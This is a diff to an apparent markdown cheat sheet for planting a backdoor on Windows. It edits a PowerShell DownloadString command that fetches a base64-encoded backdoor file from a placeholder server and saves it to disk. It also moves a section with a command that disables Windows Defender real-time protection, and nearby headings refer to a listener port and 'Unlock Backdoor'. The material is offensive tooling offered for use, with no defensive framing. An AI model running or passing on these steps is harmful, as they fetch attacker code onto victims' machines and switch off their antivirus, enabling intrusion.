@@ -28,7 +28,11 @@ python -m http.server
 ## Download String base64 backdoor
 Download String From Your Server Python
 ``` powershell
-(New-Object System.Net.WebClient).DownloadString("http://example.com/file-encode.txt")
+(New-Object System.Net.WebClient).DownloadString("http://example.com/file-encode.txt") > file-encoded.txt
+```
+## Disable Windows Defender
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 ## Ddecode Base64
 
@@ -62,10 +66,6 @@ set lport [your port]
 - Run
 ```
 run 
-```
-## Disable Windows Defender
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 ## Unlock Backdoor
 ```
